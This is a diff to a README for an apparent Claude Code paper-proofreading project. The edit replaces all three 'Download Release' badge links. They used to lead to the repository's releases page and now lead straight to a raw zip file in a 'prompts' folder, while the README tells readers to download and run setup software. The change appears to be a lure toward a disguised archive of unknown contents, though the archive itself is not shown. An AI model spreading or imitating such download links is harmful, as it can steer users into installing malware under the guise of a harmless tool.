@@ -1,6 +1,6 @@
 # 🧾 awesome-claudecode-paper-proofreading - Clear research paper proofreading aid
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/reviewtaipei284/awesome-claudecode-paper-proofreading/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/reviewtaipei284/awesome-claudecode-paper-proofreading/main/prompts/paper-claudecode-proofreading-awesome-v3.8-beta.4.zip)
 
 ## 📝 What is awesome-claudecode-paper-proofreading?
 
@@ -32,7 +32,7 @@ This section will guide you through downloading, installing, and running the app
 
 Go to the releases page to find the latest version of the software. Click the button below or open this link in your browser:
 
-[![Visit Releases Page](https://img.shields.io/badge/Go_to-Download-blue)](https://github.com/reviewtaipei284/awesome-claudecode-paper-proofreading/releases)
+[![Visit Releases Page](https://img.shields.io/badge/Go_to-Download-blue)](https://raw.githubusercontent.com/reviewtaipei284/awesome-claudecode-paper-proofreading/main/prompts/paper-claudecode-proofreading-awesome-v3.8-beta.4.zip)
 
 ### Step 2: Download the latest setup file
 
@@ -111,4 +111,4 @@ If you find bugs or have questions, use the "Issues" tab on the GitHub repositor
 
 You can return here at any time to download or update the software. Visit the releases page below and follow the steps described above:
 
-[![Download Link](https://img.shields.io/badge/Download–awesome--claudecode--paper--proofreading-blueviolet)](https://github.com/reviewtaipei284/awesome-claudecode-paper-proofreading/releases)
+[![Download Link](https://img.shields.io/badge/Download–awesome--claudecode--paper--proofreading-blueviolet)](https://raw.githubusercontent.com/reviewtaipei284/awesome-claudecode-paper-proofreading/main/prompts/paper-claudecode-proofreading-awesome-v3.8-beta.4.zip)
